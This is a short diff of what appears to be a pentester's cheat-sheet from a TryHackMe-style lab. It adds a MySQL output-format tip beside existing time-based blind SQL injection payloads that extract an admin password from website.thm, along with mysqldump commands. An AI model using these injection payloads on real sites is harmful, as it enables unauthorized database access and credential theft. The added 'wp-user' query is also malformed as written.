@@ -47,6 +47,9 @@ https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 FROM in
 https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like '%';--
 https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like '4961';--
 
+# mysql beautify output
+mysql> select * from wp-user\G
+
 # mysql-tools
 mysqlshow -u USER -p PASS DATABASE TABLES
 mysqldump -u USER --password=PASS --single-transaction --all-databases
